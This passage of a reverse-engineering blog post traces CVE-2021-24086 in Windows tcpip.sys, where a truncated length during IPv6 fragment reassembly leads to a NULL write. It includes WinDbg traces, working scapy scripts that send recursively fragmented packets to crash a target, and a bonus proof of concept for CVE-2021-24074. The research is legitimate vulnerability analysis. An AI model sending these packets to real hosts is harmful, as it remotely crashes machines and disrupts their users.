  const uint32_t HeaderAndOptionsLength = UnfragmentableLength + sizeof(ipv6_header_t);
  // …
  NetBufferList = (_NET_BUFFER_LIST *)NetioAllocateAndReferenceNetBufferAndNetBufferList(
                                        IppReassemblyNetBufferListsComplete,
                                        Reassembly,
                                        0i64,
                                        0i64,
                                        0,
                                        0);
  if ( !NetBufferList )
  {
    // ...
    goto Bail_0;
  }

  FirstNetBuffer = NetBufferList->FirstNetBuffer;
  if ( NetioRetreatNetBuffer(FirstNetBuffer, uint16_t(HeaderAndOptionsLength), 0) < 0 )
  {
    // ...
    goto Bail_1;
  }

  Buffer = (ipv6_header_t *)NdisGetDataBuffer(FirstNetBuffer, HeaderAndOptionsLength, 0i64, 1u, 0);
  //...
  *Buffer = Reassembly->Ipv6;
```

`NetioAllocateAndReferenceNetBufferAndNetBufferList` allocates a brand new NBL called `NetBufferList`. Then `NetioRetreatNetBuffer` is called:

```C
NDIS_STATUS NetioRetreatNetBuffer(_NET_BUFFER *Nb, ULONG Amount, ULONG DataBackFill)
{
  const uint32_t CurrentMdlOffset = Nb->CurrentMdlOffset;
  if ( CurrentMdlOffset < Amount )
    return NdisRetreatNetBufferDataStart(Nb, Amount, DataBackFill, NetioAllocateMdl);
  Nb->DataOffset -= Amount;
  Nb->DataLength += Amount;
  Nb->CurrentMdlOffset = CurrentMdlOffset - Amount;
  return 0;
}
```

Because the `FirstNetBuffer` just got allocated, it is empty and most of its fields are zero. This means that `NetioRetreatNetBuffer` triggers a call to `NdisRetreatNetBufferDataStart` which is publicly documented. According to the documentation, it should allocate an MDL using `NetioAllocateMdl` as the network buffer is empty as we mentioned above. One thing to notice is that the amount of bytes, `HeaderAndOptionsLength`, passed to `NetioRetreatNetBuffer` is truncated to a `uint16_t`; odd.

```C
  if ( NetioRetreatNetBuffer(FirstNetBuffer, uint16_t(HeaderAndOptionsLength), 0) < 0 )
```

Now that there is backing space in the NB for the IPv6 header as well as the unfragmentable part of the packet, it needs to get a pointer to the backing data in order to populate the buffer. `NdisGetDataBuffer` is documented as *to gain access to a contiguous block of data from a NET_BUFFER structure*. After reading the documentation several time, it was a little bit confusing to me so I figured I'd throw NDIS in IDA and have a look at the implementation:

```C
PVOID NdisGetDataBuffer(PNET_BUFFER NetBuffer, ULONG BytesNeeded, PVOID Storage, UINT AlignMultiple, UINT AlignOffset)
{
  const _MDL *CurrentMdl = NetBuffer->CurrentMdl;
  if ( !BytesNeeded || !CurrentMdl || NetBuffer->DataLength < BytesNeeded )
    return 0i64;
// ...
```

Just looking at the beginning of the implementation something stands out. As `NdisGetDataBuffer` is called with `HeaderAndOptionsLength` (**not truncated**), we should be able to hit the following condition `NetBuffer->DataLength < BytesNeeded` when `HeaderAndOptionsLength` is larger than `0xffff`. Why, you ask? Let's take an example. `HeaderAndOptionsLength` is 0x1337, so `NetioRetreatNetBuffer` allocates a backing buffer of 0x1337 bytes, and `NdisGetDataBuffer` returns a pointer to the newly allocated data; works as expected. Now let's imagine that `HeaderAndOptionsLength` is 0x31337. This means that `NetioRetreatNetBuffer` allocates 0x1337 (because of the truncation) bytes but calls `NdisGetDataBuffer` with 0x31337 which makes the call fail because the network buffer is not big enough and we hit this condition `NetBuffer->DataLength < BytesNeeded`.

As the returned pointer is trusted not to be NULL, `Ipv6pReassembleDatagram` carries on by using it for a memory write:

```C
  *Buffer = Reassembly->Ipv6;
```

This is where it should bugcheck. As usual we can verify our understanding of the function with a WinDbg session. Here is a simple Python script that sends two fragments:

```python
from scapy.all import *
id = 0xdeadbeef
first = Ether() \
    / IPv6(dst = 'ff02::1') \
    / IPv6ExtHdrFragment(id = id, m = 1, offset = 0) \
    / UDP(sport = 0x1122, dport = 0x3344) \
    / '---frag1'
second = Ether() \
    / IPv6(dst = 'ff02::1') \
    / IPv6ExtHdrFragment(id = id, m = 0, offset = 2) \
    / '---frag2'
sendp([first, second], iface='eth1')
```

Let's see what the reassembly looks like when those packets are received:

```text
kd> bp tcpip!Ipv6pReassembleDatagram

kd> g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff800`117cdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

kd> p
tcpip!Ipv6pReassembleDatagram+0x5:
fffff800`117cdd71 48894c2408      mov     qword ptr [rsp+8],rcx

// ...

kd> 
tcpip!Ipv6pReassembleDatagram+0x9c:
fffff800`117cde08 48ff1569660700  call    qword ptr [tcpip!_imp_NetioAllocateAndReferenceNetBufferAndNetBufferList (fffff800`11844478)]

kd> 
tcpip!Ipv6pReassembleDatagram+0xa3:
fffff800`117cde0f 0f1f440000      nop     dword ptr [rax+rax]

kd> r @rax
rax=ffffc107f7be1d90 <- this is the allocated NBL

kd> !ndiskd.nbl @rax
    NBL                ffffc107f7be1d90    Next NBL           NULL
    First NB           ffffc107f7be1f10    Source             NULL
                                           Pool               ffffc107f58ba980 - NETIO
    Flags              NBL_ALLOCATED

    Walk the NBL chain                     Dump data payload
    Show out-of-band information           Display as Wireshark hex dump


; The first NB is empty; its length is 0 as expected

kd> !ndiskd.nb ffffc107f7be1f10
    NB                 ffffc107f7be1f10    Next NB            NULL
    Length             0                   Source pool        ffffc107f58ba980
    First MDL          0                   DataOffset         0
    Current MDL        [NULL]              Current MDL offset 0

    View associated NBL

// ...

kd> r @rcx, @rdx
rcx=ffffc107f7be1f10 rdx=0000000000000028 <- the first NB and the size to allocate for it

kd>
tcpip!Ipv6pReassembleDatagram+0xd9:
fffff800`117cde45 e80a35ecff      call    tcpip!NetioRetreatNetBuffer (fffff800`11691354)

kd> p
tcpip!Ipv6pReassembleDatagram+0xde:
fffff800`117cde4a 85c0            test    eax,eax

; The first NB now has 0x28 bytes backing MDL

kd> !ndiskd.nb ffffc107f7be1f10
    NB                 ffffc107f7be1f10    Next NB            NULL
    Length             0n40                Source pool        ffffc107f58ba980
    First MDL          ffffc107f5ee8040    DataOffset         0n56
    Current MDL        [First MDL]         Current MDL offset 0n56

    View associated NBL

// ...

; Getting access to the backing buffer

kd> 
tcpip!Ipv6pReassembleDatagram+0xfe:
fffff800`117cde6a 48ff1507630700  call    qword ptr [tcpip!_imp_NdisGetDataBuffer (fffff800`11844178)]

kd> p
tcpip!Ipv6pReassembleDatagram+0x105:
fffff800`117cde71 0f1f440000      nop     dword ptr [rax+rax]

; This is the backing buffer; it has leftover data, but gets initialized later

kd> db @rax
ffffc107`f5ee80b0  05 02 00 00 01 00 8f 00-41 dc 00 00 00 01 04 00  ........A.......
```

All right, so it sounds like we have a plan - let's get to work.

## Manufacturing a packet of the death: chasing phantoms

Well... sending a packet with a large header should be trivial right? That's initially what I thought. After trying various things to achieve this goal, I quickly realized it wouldn't be that easy. The main issue is the MTU. Basically, network devices don't allow you to send packets bigger than like ~1200 bytes. Online content suggests that some ethernet cards and network switches allow you to bump this limit. Because I was running my test in my own Hyper-V lab, I figured it was fair enough to try to reproduce the NULL dereference with non-default parameters, so I looked for a way to increase the MTU on the virtual switch to 64k.

The issue with that is that Hyper-V didn't allow me to do that. The only parameter I found allowed me to bump the limit to about 9k which is very far from the 64k I needed to trigger this issue. At this point, I felt frustrated because I felt I was **so close** to the end, but no cigar. Even though I had read that this vulnerability could be thrown over the internet, I kept going in this wrong direction. If it could be thrown from the internet, it meant it had to go through regular network equipment and there was no way a 64k packet would work. But I ignored this hard truth for a bit of time.

Eventually, I accepted the fact that I was probably heading the wrong direction, ugh. So I reevaluated my options. I figured that the bugcheck I triggered above was not the one that I would be able to trigger with packets thrown from the Internet. Maybe though there might be another code-path having a very similar pattern (retreat + `NdisGetDataBuffer`) that would result in a bugcheck. I've noticed that the `TotalLength` field is also truncated a bit further down in the function and written in the IPv6 header of the packet. This header is eventually copied in the final reassembled IPv6 header:

```C
// The ROR2 is basically htons.
// One weird thing here is that TotalLength is truncated to 16b.
// We are able to make TotalLength >= 0x10000 by crafting a large
// packet via fragmentation.
// The issue with that is that, the size from the IPv6 header is smaller than
// the real total size. It's kinda hard to see how this would cause subsequent
// issue but hmm, yeah.
Reassembly->Ipv6.length = __ROR2__(TotalLength, 8);
// B00m, Buffer can be NULL here because of the issue discussed above.
// This copies the saved IPv6 header from the first fragment into the
// first part of the reassembled packet.
*Buffer = Reassembly->Ipv6;
```

My theory was that there might be some code that would read this `Ipv6.length` (which is truncated as `__ROR2__` expects a `uint16_t`) and something bad might happen as a result. Although, the `length` would end up having a smaller value than the actual real size of the packet; it was hard for me to come up with a scenario where this would cause an issue but I still chased this theory as this was the only thing I had.

What I started to do at this point is to audit every demuxer that we saw earlier. I looked for ones that would use this `length` field somehow and looked for similar retreat / `NdisGetDataBuffer` patterns. Nothing. Thinking I might be missing something statically so I also heavily used WinDbg to verify my work. I used hardware breakpoints to track access to those two bytes but no hit. Ever. Frustrating.

After trying and trying I started to think that I might have been headed in the wrong direction again. Maybe, I really need to find a way to send such a large packet without violating the MTU. But how?

## Manufacturing a packet of the death: leap of faith

All right so I decided to start fresh again. Going back to the big picture, I've studied a bit more the reassembly algorithm, diffed again just in case I missed a clue somewhere, but nothing...

Could I maybe be able to fragment a packet that has a very large header and trick the stack into reassembling the reassembled packet? We've seen previously that we could use reassembly as a primitive to stitch fragments together; so instead of trying to send a very large fragment maybe we could break down a large one into smaller ones and have them stitched together in memory. It honestly felt like a long leap forward, but based on my reverse-engineering effort I didn't really see anything that would prevent that. The idea was blurry but felt like it was worth a shot. How would it really work though?

Sitting down for a minute, this is the theory that I came up with. I created a very large fragment that has many headers; enough to trigger the bug assuming I could trigger another reassembly. Then, I fragmented this fragment so that it can be sent to the target without violating the MTU.

```python
reassembled_pkt = IPv6ExtHdrDestOpt(options = [
        PadN(optdata=('a'*0xff)),
        PadN(optdata=('b'*0xff)),
        PadN(optdata=('c'*0xff)),
        PadN(optdata=('d'*0xff)),
        PadN(optdata=('e'*0xff)),
        PadN(optdata=('f'*0xff)),
        PadN(optdata=('0'*0xff)),
    ]) \
    # ....
    / IPv6ExtHdrDestOpt(options = [
        PadN(optdata=('a'*0xff)),
        PadN(optdata=('b'*0xa0)),
    ]) \
    / IPv6ExtHdrFragment(
        id = second_pkt_id, m = 1,
        nh = 17, offset = 0
    ) \
    / UDP(dport = 31337, sport = 31337, chksum=0x7e7f)

reassembled_pkt = bytes(reassembled_pkt)
frags = frag6(args.target, frag_id, reassembled_pkt, 60)
```

The reassembly happens and `tcpip.sys` builds this huge reassembled fragment in memory; that's great as I didn't think it would work. Here is what it looks like in WinDbg:

```text
kd> bp tcpip+01ADF71 ".echo Reassembled NB; r @r14;"

kd> g
Reassembled NB
r14=ffff800fa2a46f10
tcpip!Ipv6pReassembleDatagram+0x205:
fffff801`0a7cdf71 41394618        cmp     dword ptr [r14+18h],eax

kd> !ndiskd.nb @r14
    NB                 ffff800fa2a46f10    Next NB            NULL
    Length                10020            Source pool        ffff800fa06ba240
    First MDL          ffff800fa0eb1180    DataOffset         0n56
    Current MDL        [First MDL]         Current MDL offset 0n56

    View associated NBL

kd> !ndiskd.nbl ffff800fa2a46d90
    NBL                ffff800fa2a46d90    Next NBL           NULL
    First NB           ffff800fa2a46f10    Source             NULL
                                           Pool               ffff800fa06ba240 - NETIO
    Flags              NBL_ALLOCATED

    Walk the NBL chain                     Dump data payload
    Show out-of-band information           Display as Wireshark hex dump

kd> !ndiskd.nbl ffff800fa2a46d90 -data
NET_BUFFER ffff800fa2a46f10
  MDL ffff800fa0eb1180
    ffff800fa0eb11f0  60 00 00 00 ff f8 3c 40-fe 80 00 00 00 00 00 00  `·····<@········
    ffff800fa0eb1200  02 15 5d ff fe e4 30 0e-ff 02 00 00 00 00 00 00  ··]···0·········
    ffff800fa0eb1210  00 00 00 00 00 00 00 01                          ········

  ...

  MDL ffff800f9ff5e8b0
    ffff800f9ff5e8f0  3c e1 01 ff 61 61 61 61-61 61 61 61 61 61 61 61  <···aaaaaaaaaaaa
    ffff800f9ff5e900  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e910  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e920  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e930  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e940  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e950  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e960  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa

  ...

  MDL ffff800fa0937280
    ffff800fa09372c0  7a 69 7a 69 00 08 7e 7f                          zizi··~·
```

What we see above is the reassembled first fragment.

```python
reassembled_pkt = IPv6ExtHdrDestOpt(options = [
        PadN(optdata=('a'*0xff)),
        PadN(optdata=('b'*0xff)),
        PadN(optdata=('c'*0xff)),
        PadN(optdata=('d'*0xff)),
        PadN(optdata=('e'*0xff)),
        PadN(optdata=('f'*0xff)),
        PadN(optdata=('0'*0xff)),
    ]) \
    # ...
    / IPv6ExtHdrDestOpt(options = [
        PadN(optdata=('a'*0xff)),
        PadN(optdata=('b'*0xa0)),
    ]) \
    / IPv6ExtHdrFragment(
        id = second_pkt_id, m = 1,
        nh = 17, offset = 0
    ) \
    / UDP(dport = 31337, sport = 31337, chksum=0x7e7f)
```

It is a fragment that is 10020 bytes long, and you can see that the `ndiskd` extension walks the long MDL chain that describes the content of this fragment. The last MDL is the header of the UDP part of the fragment. What is left to do is to trigger another reassembly. What if we send another fragment that is part of the same group; would this trigger another reassembly?

Well, let's see if the below works I guess:

```python
reassembled_pkt_2 = Ether() \
    / IPv6(dst = args.target) \
    / IPv6ExtHdrFragment(id = second_pkt_id, m = 0, offset = 1, nh = 17) \
    / 'doar-e ftw'

sendp(reassembled_pkt_2, iface = args.iface)
```

Here is what we see in WinDbg:

```text
kd> bp tcpip!Ipv6pReassembleDatagram

; This is the first reassembly; the output packet is the first large fragment

kd> g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff805`4a5cdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

; This is the second reassembly; it combines the first very large fragment, and the second fragment we just sent

kd> g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff805`4a5cdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

...

; Let's see the bug happen live!

kd> 
tcpip!Ipv6pReassembleDatagram+0xce:
fffff805`4a5cde3a 0fb79424a8000000 movzx   edx,word ptr [rsp+0A8h]

kd> 
tcpip!Ipv6pReassembleDatagram+0xd6:
fffff805`4a5cde42 498bce          mov     rcx,r14

kd> 
tcpip!Ipv6pReassembleDatagram+0xd9:
fffff805`4a5cde45 e80a35ecff      call    tcpip!NetioRetreatNetBuffer (fffff805`4a491354)

kd> r @edx
edx=10 <- truncated size

// ...

kd> 
tcpip!Ipv6pReassembleDatagram+0xe6:
fffff805`4a5cde52 8b9424a8000000  mov     edx,dword ptr [rsp+0A8h]

kd> 
tcpip!Ipv6pReassembleDatagram+0xed:
fffff805`4a5cde59 41b901000000    mov     r9d,1

kd> 
tcpip!Ipv6pReassembleDatagram+0xf3:
fffff805`4a5cde5f 8364242000      and     dword ptr [rsp+20h],0

kd> 
tcpip!Ipv6pReassembleDatagram+0xf8:
fffff805`4a5cde64 4533c0          xor     r8d,r8d

kd> 
tcpip!Ipv6pReassembleDatagram+0xfb:
fffff805`4a5cde67 498bce          mov     rcx,r14

kd> 
tcpip!Ipv6pReassembleDatagram+0xfe:
fffff805`4a5cde6a 48ff1507630700  call    qword ptr [tcpip!_imp_NdisGetDataBuffer (fffff805`4a644178)]

kd> r @rdx
rdx=0000000000010010 <- non truncated size

kd> p
tcpip!Ipv6pReassembleDatagram+0x105:
fffff805`4a5cde71 0f1f440000      nop     dword ptr [rax+rax]

kd> r @rax
rax=0000000000000000 <- NdisGetDataBuffer returned NULL!!!

kd> g
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x000000d1
                       (0x0000000000000000,0x0000000000000002,0x0000000000000001,0xFFFFF8054A5CDEBB)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff805`473c46a0 cc              int     3

kd> kc
 # Call Site
00 nt!DbgBreakPointWithStatus
01 nt!KiBugCheckDebugBreak
02 nt!KeBugCheck2
03 nt!KeBugCheckEx
04 nt!KiBugCheckDispatch
05 nt!KiPageFault
06 tcpip!Ipv6pReassembleDatagram
07 tcpip!Ipv6pReceiveFragment
08 tcpip!Ipv6pReceiveFragmentList
09 tcpip!IppReceiveHeaderBatch
0a tcpip!IppFlcReceivePacketsCore
0b tcpip!IpFlcReceivePackets
0c tcpip!FlpReceiveNonPreValidatedNetBufferListChain
0d tcpip!FlReceiveNetBufferListChainCalloutRoutine
0e nt!KeExpandKernelStackAndCalloutInternal
0f nt!KeExpandKernelStackAndCalloutEx
10 tcpip!FlReceiveNetBufferListChain
11 NDIS!ndisMIndicateNetBufferListsToOpen
12 NDIS!ndisMTopReceiveNetBufferLists
13 NDIS!ndisCallReceiveHandler
14 NDIS!ndisInvokeNextReceiveHandler
15 NDIS!NdisMIndicateReceiveNetBufferLists
16 netvsc!ReceivePacketMessage
17 netvsc!NvscKmclProcessPacket
18 nt!KiInitializeKernel
19 nt!KiSystemStartup
```

Incredible! We managed to implement the recursive fragmentation idea we discussed. Wow, I really didn't think it would actually work. Morale of the day: don't leave any rocks unturned, follow your intuitions and reach the state of no unknowns.

<center>![trigger](/images/reverse_engineering_tcpip/trigger.gif)</center>

# Conclusion

In this post I tried to take you with me through my journey to write a PoC for CVE-2021-24086, a true remote DoS vulnerability affecting Windows' tcpip.sys driver found by Microsoft own's [@piazzt](https://twitter.com/piazzt). From zero to remote BSoD. The PoC is available on [my github](https://github.com/0vercl0k) here: [0vercl0k/CVE-2021-24086](https://github.com/0vercl0k/CVE-2021-24086).

It was a wild ride mainly because it all looked way too easy and because I ended up chasing a bunch of ghosts.

I am sure that I've lost about 99% of my readers as it is a fairly long and hairy post, but if you made it all the way there you should join and come hang in the newly created *Diary of a reverse-engineer* Discord: [https://discord.gg/4JBWKDNyYs](https://discord.gg/4JBWKDNyYs). We're trying to build a community of people enjoying low level subjects. Hopefully we can also generate more interest for external contributions :)

Last but not least, special greets to the usual suspects: [@yrp604](https://twitter.com/yrp604) and [@__x86](https://twitter.com/__x86) and [@jonathansalwan](https://twitter.com/jonathansalwan) for proof-reading this article.

# Bonus: CVE-2021-24074

Here is the Poc I built based on the high quality blogpost put out by [Armis](https://www.armis.com/resources/iot-security-blog/from-urgent-11-to-frag-44-microsoft-patches-critical-vulnerabilities-in-windows-tcp-ip-stack/):

```python
# Axel '0vercl0k' Souchet - April 4 2021
# Extremely detailed root-cause analysis was made by Armis:
# https://www.armis.com/resources/iot-security-blog/from-urgent-11-to-frag-44-microsoft-patches-critical-vulnerabilities-in-windows-tcp-ip-stack/
from scapy.all import *
import argparse
import codecs
import random

def trigger(args):
    '''
    kd> g
    oob?
    tcpip!Ipv4pReceiveRoutingHeader+0x16a:
    fffff804`453c6f7a 4d8d2c1c        lea     r13,[r12+rbx]
    kd> p
    tcpip!Ipv4pReceiveRoutingHeader+0x16e:
    fffff804`453c6f7e 498bd5          mov     rdx,r13
    kd> db @r13
    ffffb90e`85b78220  c0 82 b7 85 0e b9 ff ff-38 00 04 10 00 00 00 00  ........8.......
    kd> dqs @r13 l1
    ffffb90e`85b78220  ffffb90e`85b782c0
    kd> p
    tcpip!Ipv4pReceiveRoutingHeader+0x171:
    fffff804`453c6f81 488d0d58830500  lea     rcx,[tcpip!Ipv4Global (fffff804`4541f2e0)]
    kd>
    tcpip!Ipv4pReceiveRoutingHeader+0x178:
    fffff804`453c6f88 e8d7e1feff      call    tcpip!IppIsInvalidSourceAddressStrict (fffff804`453b5164)
    kd> db @rdx
    kd> p
    tcpip!Ipv4pReceiveRoutingHeader+0x17d:
    fffff804`453c6f8d 84c0            test    al,al
    kd> r.
    al=00000000`00000000  al=00000000`00000000
    kd> p
    tcpip!Ipv4pReceiveRoutingHeader+0x17f:
    fffff804`453c6f8f 0f85de040000    jne     tcpip!Ipv4pReceiveRoutingHeader+0x663 (fffff804`453c7473)
    kd>
    tcpip!Ipv4pReceiveRoutingHeader+0x185:
    fffff804`453c6f95 498bcd          mov     rcx,r13
    kd>
    Breakpoint 3 hit
    tcpip!Ipv4pReceiveRoutingHeader+0x188:
    fffff804`453c6f98 e8e7dff8ff      call    tcpip!Ipv4UnicastAddressScope (fffff804`45354f84)
    kd> dqs @rcx l1
    ffffb90e`85b78220  ffffb90e`85b782c0

    Call-stack (skip first hit):
      kd> kc
      # Call Site
      00 tcpip!Ipv4pReceiveRoutingHeader
      01 tcpip!IppReceiveHeaderBatch
      02 tcpip!Ipv4pReassembleDatagram
      03 tcpip!Ipv4pReceiveFragment
      04 tcpip!Ipv4pReceiveFragmentList
      05 tcpip!IppReceiveHeaderBatch
      06 tcpip!IppFlcReceivePacketsCore
      07 tcpip!IpFlcReceivePackets
      08 tcpip!FlpReceiveNonPreValidatedNetBufferListChain
      09 tcpip!FlReceiveNetBufferListChainCalloutRoutine
      0a nt!KeExpandKernelStackAndCalloutInternal
      0b nt!KeExpandKernelStackAndCalloutEx
      0c tcpip!FlReceiveNetBufferListChain

    Snippet:
      __int16 __fastcall Ipv4pReceiveRoutingHeader(Packet_t *Packet)
      {
        // ...
        // kd> db @rax
        // ffffdc07`ff209170  ff ff 04 00 61 62 63 00-54 24 30 48 89 14 01 48  ....abc.T$0H...H
        RoutingHeaderFirst = NdisGetDataBuffer(FirstNetBuffer, Packet->RoutingHeaderOptionLength, &v50[0].qw2, 1u, 0);
        NetioAdvanceNetBufferList(NetBufferList, v8);
        OptionLenFirst = RoutingHeaderFirst[1];
        LenghtOptionFirstMinusOne = (unsigned int)(unsigned __int8)RoutingHeaderFirst[2] - 1;
        RoutingOptionOffset = LOBYTE(Packet->RoutingOptionOffset);
        if (OptionLenFirst < 7u ||
          LenghtOptionFirstMinusOne > OptionLenFirst - sizeof(IN_ADDR))
        {
          // ...
          goto Bail_0;
        }
        // ...
    '''
    id = random.randint(0, 0xff)
    # dst_ip isn't a broadcast IP because otherwise we fail a check in
    # Ipv4pReceiveRoutingHeader; if we don't take the below branch
    # we don't hit the interesting bits later:
    #   if (Packet->CurrentDestinationType == NlatUnicast) {
    #     v12 = &RoutingHeaderFirst[LenghtOptionFirstMinusOne];
    dst_ip = '192.168.2.137'
    src_ip = '120.120.120.0'
    # UDP
    nh = 17
    content = bytes(UDP(sport = 31337, dport = 31338) / '1')
    one = Ether() \
        / IP(
            src = src_ip,
            dst = dst_ip,
            flags = 1,
            proto = nh,
            frag = 0,
            id = id,
            options = [IPOption_Security(
                length = 0xb,
                security = 0x11,
                # This is used for as an ~upper bound in Ipv4pReceiveRoutingHeader:
                compartment = 0xffff,
                # This is the offset that allows us to index out of the
                # bounds of the second fragment.
                # Keep in mind that, the out of bounds data is first used
                # before triggering any corruption (in Ipv4pReceiveRoutingHeader):
                #  - IppIsInvalidSourceAddressStrict,
                #  - Ipv4UnicastAddressScope.
                # if (IppIsInvalidSourceAddressStrict(Ipv4Global, &RoutingHeaderFirst[LenghtOptionFirstMinusOne])
                #     || (Ipv4UnicastAddressScope(&RoutingHeaderFirst[LenghtOptionFirstMinusOne]),
                #         v13 = Ipv4UnicastAddressScope(&Packet->RoutingOptionSourceIp),
                #         v14 < v13) )
                # The upper byte of handling_restrictions is `RoutingHeaderFirst[2]` in the above snippet
                # Offset of 6 allows us to have &RoutingHeaderFirst[LenghtOptionFirstMinusOne] pointing on
                # one.IP.options.transmission_control_code; last byte is OOB.
                #   kd>
                #   tcpip!Ipv4pReceiveRoutingHeader+0x178:
                #   fffff804`5c076f88 e8d7e1feff      call    tcpip!IppIsInvalidSourceAddressStrict (fffff804`5c065164)
                #   kd> db @rdx
                #   ffffdc07`ff209175  62 63 00 54 24 30 48 89-14 01 48 c0 92 20 ff 07  bc.T$0H...H.. ..
                #                                ^
                #                                |_ oob
                handling_restrictions = (6 << 8),
                transmission_control_code = b'\x11\xc1\xa8'
            )]
        ) / content[: 8]
    two = Ether() \
        / IP(
            src = src_ip,
            dst = dst_ip,
            flags = 0,
            proto = nh,
            frag = 1,
            id = id,
            options = [
                IPOption_NOP(),
                IPOption_NOP(),
                IPOption_NOP(),
                IPOption_NOP(),
                IPOption_LSRR(
                    pointer = 0x8,
                    routers = ['11.22.33.44']
                ),
            ]
        ) / content[8: ]

    sendp([one, two], iface='eth1')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default = 'ff02::1')
    parser.add_argument('--dport', default = 500)
    args = parser.parse_args()
    trigger(args)
    return

if __name__ == '__main__':
    main()
```
